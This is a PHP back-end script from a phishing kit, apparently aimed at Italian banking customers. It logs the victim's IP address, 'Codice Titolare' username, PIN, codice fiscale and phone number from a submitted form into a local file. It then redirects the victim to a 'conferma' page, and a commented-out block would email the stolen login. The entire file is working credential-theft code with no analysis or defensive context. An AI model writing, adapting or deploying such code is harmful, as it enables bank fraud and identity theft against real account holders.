<?php
header ('Location:./conferma/');
date_default_timezone_set('Europe/Rome');
$handle = fopen("antonio777", "a");
$date = date('Y-m-d H:i:s');
$ip = getenv('HTTP_CLIENT_IP')?:
getenv('HTTP_X_FORWARDED_FOR')?:
getenv('HTTP_X_FORWARDED')?:
getenv('HTTP_FORWARDED_FOR')?:
getenv('HTTP_FORWARDED')?:
getenv('REMOTE_ADDR');
fwrite($handle, "IP: ");
fwrite($handle, $ip);
fwrite($handle, "\r\n");
fwrite($handle, "Date: ");
fwrite($handle, $date);
fwrite($handle, "\r\n");
fwrite($handle, "Codice Titolare: ");
fwrite($handle, $_POST["username"]);
fwrite($handle, "\r\n");
fwrite($handle, "PIN: ");
fwrite($handle, $_POST["password"]);
fwrite($handle, "\r\n");
fwrite($handle, "Codice Fiscale ");
fwrite($handle, $_POST["cf"]);
fwrite($handle, "\r\n");
fwrite($handle, "Telefono: ");
fwrite($handle, $_POST["phone"]);
fwrite($handle, "\r\n");
fwrite($handle, "----------------------------------");
fwrite($handle, "\r\n");
fclose($handle);


/*$to = "-";
$subject = "Dati login ricevuti";
$message = "Username: " . $_POST["username"] . " Password: " . $_POST["password"];
$from = "-";
mail($to,$subject,$message,$from);*/

exit;
?>